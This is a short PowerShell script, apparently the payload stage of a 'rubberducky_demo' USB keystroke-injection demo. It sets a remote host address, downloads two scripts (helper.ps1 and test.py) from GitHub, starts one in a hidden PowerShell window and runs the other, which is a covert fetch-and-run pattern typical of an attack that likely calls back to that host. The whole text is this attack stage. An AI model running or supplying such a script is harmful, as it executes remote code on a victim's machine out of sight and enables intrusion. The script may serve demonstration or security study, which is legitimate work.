$RHOST = '172.18.141.67'

curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/helper.ps1 -O .\helper.ps1
curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/test.py -O .\test.py

Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList "-NoExit -Command .\helper.ps1"

python test.py
